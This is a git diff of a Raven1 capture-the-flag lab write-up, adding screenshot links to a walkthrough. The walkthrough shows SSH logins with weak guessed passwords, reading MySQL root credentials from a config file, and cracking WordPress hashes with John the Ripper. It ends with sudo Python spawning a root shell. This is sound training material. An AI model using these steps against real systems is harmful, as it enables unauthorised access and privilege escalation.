@@ -32,6 +32,8 @@ By using inspect element, on each page we are able to locate **Flag1**
 
 ●	**flag1.txt: b9bbcb33e11b80be759c4e844862482d**
 
+<img src="https://github.com/OmarG13/Raven1-Pen-Test/blob/main/Images/Picture3.png">
+
 ____________________________________________
 
 
@@ -45,11 +47,15 @@ ssh micahel@192.168.1.110
 ```
 Password: michael
 
+<img src="https://github.com/OmarG13/Raven1-Pen-Test/blob/main/Images/Picture4.png">
+
 ```
 find / -type f -iname flag*.*
 ```
 
 ●	**flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c**
+
+<img src=https://github.com/OmarG13/Raven1-Pen-Test/blob/main/Images/Picture6.png">
 
 ____________________________________
 
@@ -58,6 +64,9 @@ The file is available and accessible.
 Simply opening the file in a text editor reveals the username and password of the MySQL database.
 MySQL username: root
 MySQL password: R@v3nSecurity
+
+
+<img src="https://github.com/OmarG13/Raven1-Pen-Test/blob/main/Images/Picture7.png">
 
 Within the MySQL database we then navigate the various tables and locate **Flag3**
 
@@ -68,6 +77,10 @@ show tables;
 select * from wp_posts;
 ```
 ●	**Flag3.txt: afc01ab56b50591e7dccf93122770cd2**
+
+<img src="https://github.com/OmarG13/Raven1-Pen-Test/blob/main/Images/Picture9.png">
+
+*You can also clearly see that Flag4 is right there as well, however, in the interest of exploring this CTF further, we continue investigating as below.*
 
 ______________________________________
 
@@ -81,6 +94,9 @@ show tables;
 select * from wp_users;
 ```
 
+<img src="https://github.com/OmarG13/Raven1-Pen-Test/blob/main/Images/Picture10.png">
+
+
 Copy/paste the hashes into wp_password_hashes.txt and use John The Ripper to crack it.
 
 ```
@@ -90,6 +106,7 @@ John --wordlist=usr/share/wordlists/rockyou.txt wp_password_hashes.txt
 Steven’s password: pink84
 
 We can now log into Steven's account, spawn a shell, and find **Flag4**
+
 ```
 Ssh steven@192.168.1.110
 Sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
@@ -98,3 +115,4 @@ Sudo find / -type f -iname flag*
 
 ●	**Flag4.txt: 715dea6c055b9fe3337544932f2941ce**
 
+<img src="https://github.com/OmarG13/Raven1-Pen-Test/blob/main/Images/Picture16.png">
